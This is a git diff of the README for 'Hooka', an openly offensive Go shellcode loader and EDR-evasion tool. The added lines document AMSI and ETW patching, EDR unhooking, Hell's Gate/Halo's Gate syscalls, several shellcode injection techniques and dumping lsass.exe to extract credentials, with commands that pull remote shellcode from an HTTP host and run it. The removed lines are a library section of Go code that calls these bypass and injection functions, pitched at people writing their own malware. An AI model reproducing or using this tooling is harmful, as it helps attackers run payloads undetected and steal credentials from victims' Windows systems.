@@ -26,7 +26,7 @@ However I've also taken some code from [BananaPhone](https://github.com/C-Sto/Ba
 - ***AMSI*** and ***ETW*** patch
 - Detects hooked functions (i.e. NtCreateThread)
 - Compatible with base64 and hex encoded shellcode
-- Recycled Gate technique
+- Hell's Gate + Halo's Gate technique
 - Capable of unhooking functions via multiple techniques:
   - Classic unhooking
   - Full DLL unhooking
@@ -35,9 +35,10 @@ However I've also taken some code from [BananaPhone](https://github.com/C-Sto/Ba
 - Multiple shellcode injection techniques:
   - CreateRemoteThread
   - Fibers
-  - OpenProcess
+  - CreateProcess
   - EarlyBirdAPC
   - UuidFromString
+  - QueueApcThread
 
 - Dump lsass.exe process to a file
 - Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
@@ -61,10 +62,45 @@ ZwQuerySystemTime
 
 ```sh
 git clone https://github.com/D3Ext/Hooka
+cd Hooka
+go build .
 ```
 
 > Help panel
 ```
+  _   _                   _              _
+ | | | |   ___     ___   | | __   __ _  | |
+ | |_| |  / _ \   / _ \  | |/ /  / _` | | |
+ |  _  | | (_) | | (_) | |   <  | (_| | |_|
+ |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
+ by D3Ext - v0.1
+
+  -amsi
+        overwrite AmsiScanBuffer memory address to patch AMSI (Anti Malware Scan Interface)
+  -b64
+        decode base64 encoded shellcode
+  -dll string
+        path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)
+  -etw
+        overwrite EtwEventWrite memory address to patch ETW (Event Tracing for Windows)
+  -file string
+        path to file where shellcode is stored
+  -halos
+        use Hell's Gate and Halo's Gate to resolve syscalls (not all injection techniques are covered)
+  -hex
+        decode hex encoded shellcode
+  -hooks
+        dinamically detect hooked functions by EDR
+  -lsass string
+        dump lsass.exe process memory into a file to extract credentials (run as admin)
+  -t string
+        shellcode injection technique: CreateRemoteThread, Fibers, CreateProcess, EarlyBirdApc, UuidFromString (default: random)
+  -test
+        test shellcode injection capabilities by spawning a calc.exe
+  -unhook int
+        overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart
+  -url string
+        remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)
 ```
 
 > Detect hooked functions by EDR (including false positives)
@@ -89,13 +125,9 @@ git clone https://github.com/D3Ext/Hooka
 .\Hooka.exe --file shellcode.bin
 ```
 
-> Decode shellcode from hex
+> Decode shellcode as hex or base64
 ```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --hex
-```
-
-> Decode shellcode from base64
-```sh
+.\Hooka.exe --file shellcode.bin --hex
 .\Hooka.exe --file shellcode.bin --b64
 ```
 
@@ -109,9 +141,10 @@ git clone https://github.com/D3Ext/Hooka
 .\Hooka.exe --file shellcode.bin --unhook 3
 ```
 
-> Patch AMSI
+> Patch AMSI and/or ETW
 ```sh
 .\Hooka.exe --url http://192.168.116.37/shellcode.bin --amsi
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin --etw
 ```
 
 As you can see Hooka provides a lot of CLI flags to help you in all kind of situations
@@ -139,7 +172,7 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 
 :black_square_button: More injection techniques
 
-:black_square_button: Better error handling
+:black_square_button: `--pid` flag to handle process injection
 
 :black_square_button: Integrated Seatbelt.exe using CLR
 
@@ -147,202 +180,7 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 
 # Library
 
-- If you're looking to implement any function in your malware you can do it using the official package API.
-
-> First of all download the package
-```sh
-go get github.com/D3Ext/Hooka/pkg/hooka
-```
-
-> Detect hooked functions (including false positives)
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-func main(){
-  // Returns all hooked functions
-  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println(hooks)
-
-  // Check if an especific function is hooked
-  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println(check) // true or false
-}
-```
-
-> Resolve syscalls via API hashing
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-func main(){
-
-  // 8c2beefa1c516d318252c9b1b45253e0549bb1c4 = NtCreateThread
-  // it comes from: hooka.HashFromFunc("NtCreateThread")
-
-  // Returns a pointer to function like NewProc()
-  proc, err := hooka.FuncFromHash("8c2beefa1c516d318252c9b1b45253e0549bb1c4")
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  // Now use the procedure as loading it from dll
-  r, err := hooka.Syscall(
-    proc,
-    arg1,
-    arg2,
-    arg3,
-    arg4,
-  )
-
-  ...
-}
-```
-
-> Apply AMSI and/or ETW patch
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-func main(){
-  // Amsi bypass
-  err := hooka.PatchAmsi()
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println("AMSI bypassed!")
-
-  // ETW bypass
-  err = hooka.PatchEtw()
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println("ETW bypassed!")
-}
-```
-
-> Get syscall id with Hell's Gate + Halo's Gate
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-func main(){
-  // Get syscall id of function, only ntdll.dll is supported
-  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  fmt.Println("Syscall ID:", sysId)
-
-  r, err := hooka.Syscall( // Execute syscall
-    sysId,  // especify func
-    arg1,   // pass neccesary arguments
-    arg2,
-    arg3,
-    arg4,
-  )
-
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  fmt.Println("Error code:", r)
-}
-```
-
-> Use shellcode injection techniques
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-var calc_shellcode = []byte{}
-
-func main(){
-  err := hooka.Fibers(calc_shellcode)
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println("Shellcode injected via Fibers")
-
-  err = hooka.CreateProcess(calc_shellcode)
-  if err != nil {
-    log.Fatal(err)
-  }
-  fmt.Println("Shellcode injected via CreateProcess")
-  
-}
-```
-
-> Unhook a function (3 ways)
-```go
-package main
-
-import (
-  "fmt"
-  "log"
-
-  "github.com/D3Ext/Hooka/pkg/hooka"
-)
-
-func main(){
-  // Use classic technique which overwrites 
-  err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  // This technique loads original ntdll.dll from disk into memory to restore all functions
-  err = hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  // Use modern Perun's Fart technique which 
-  err = hooka.PerunsUnhook()
-  if err != nil {
-    log.Fatal(err)
-  }
-
-  fmt.Println("[+] Functions should have been unhooked!")
-}
-```
+To use the official package API see [here](https://github.com/D3Ext/Hooka/tree/main/examples)
 
 # Contributing
 
